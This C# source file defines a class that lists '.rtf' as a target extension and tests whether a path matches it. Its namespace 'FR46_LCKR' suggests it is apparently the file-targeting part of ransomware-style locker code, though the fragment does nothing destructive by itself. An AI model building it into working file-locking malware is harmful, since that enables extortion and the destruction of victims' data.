using System;
using System.Linq;

namespace FR46_LCKR
{
    internal class Fil_ext : IFil_ext
    {
        private const string V = ".rtf";

        public string[] TargetFiles { get; } =
            {
            V
        };

        public bool IsTargetFile(string fPath)
        {
            var fileExtension = System.IO.Path.GetExtension(fPath).ToLower();
            return TargetFiles.Contains(fileExtension);
        }
    }
}
